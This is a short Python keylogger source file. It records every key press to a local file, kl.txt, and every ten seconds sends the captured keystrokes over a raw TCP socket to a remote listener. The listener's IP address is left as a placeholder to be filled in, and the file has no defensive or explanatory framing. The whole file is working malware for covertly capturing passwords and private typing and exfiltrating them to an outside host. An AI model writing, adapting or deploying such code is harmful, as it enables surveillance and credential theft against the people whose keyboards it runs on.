import keyboard
import socket
import time
import os

klfile = 'kl.txt'
server = 'xxx.xxx.xxx.xxx' # Change to the listening IP
port = 3691 # Start server on this port

def send_keylog_data(data):
   with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      try:
         s.connect((server, port))
         s.sendall(data.encode())
      except Exception as e:
         print(f"Did not Work: {e}")

def on_key_press(event):
   with open(klfile, 'a') as f:
      f.write('{}\n'.format(event.name))

keyboard.on_press(on_key_press)

if not os.path.exists(klfile):
   open(klfile, 'w').close()

while True:
   time.sleep(10)
   with open(klfile, 'r') as f:
      keylog_data = f.read()
      send_keylog_data(keylog_data)
      f.seek(0)
      f.truncate()